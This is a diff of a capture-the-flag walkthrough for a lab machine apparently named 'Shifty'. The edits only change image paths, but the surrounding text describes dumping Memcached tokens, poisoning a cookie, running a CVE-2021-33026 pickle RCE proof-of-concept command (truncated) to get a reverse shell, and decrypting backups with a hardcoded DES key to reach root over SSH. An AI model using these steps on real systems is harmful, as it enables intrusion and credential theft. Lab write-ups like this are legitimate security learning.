@@ -44,15 +44,15 @@ Interesting.
 
 Port 80 looked rather static:
 
-![](<../../../.gitbook/assets/image%20(2223).png>)
+![](../../../.gitbook/assets/shifty-4.png)
 
 There was no public exploit for this software either, so let's move on. Port 5000 looked way more promising:
 
-![](<../../../.gitbook/assets/image%20(2148).png>)
+![](../../../.gitbook/assets/shifty-2.png)
 
 We can login, and there's no additional functionality with this website. Viewing the requests, we can see that the login just assigned us a token:
 
-![](<../../../.gitbook/assets/image%20(3658).png>)
+![](../../../.gitbook/assets/shifty-7.png)
 
 Moving to Memcache, we can dump it using `memcdump`. We instantly get loads of tokens:
 
@@ -83,7 +83,7 @@ Upgrade-Insecure-Requests: 1
 
 Interestingly, this cookie is stored in Memcached, indicating there's no cookie sanitisation there. Perhaps this could be poisoned?
 
-![](<../../../.gitbook/assets/image%20(3353).png>)
+![](../../../.gitbook/assets/shifty-6.png)
 
 ### Pickling RCE
 
@@ -116,7 +116,7 @@ $ python3 cve-2021-33026_PoC.py --rhost '192.168.202.59' --rport '5000' --cmd 'n
 
 We would get a shell on our listener port:
 
-![](<../../../.gitbook/assets/image%20(2222).png>)
+![](../../../.gitbook/assets/shifty-3.png)
 
 ## Privilege Escalation
 
@@ -201,10 +201,10 @@ for FILE in *; do openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000
 
 Then, we can read all of the files. Within the decrypted files, there was a SSH private key:
 
-![](<../../../.gitbook/assets/image%20(2615).png>)
+![](../../../.gitbook/assets/shifty-5.png)
 
 Using this, we can `ssh` in as `root`:
 
-![](<../../../.gitbook/assets/image%20(1698).png>)
+![](../../../.gitbook/assets/shifty-1.png)
 
 Rooted!
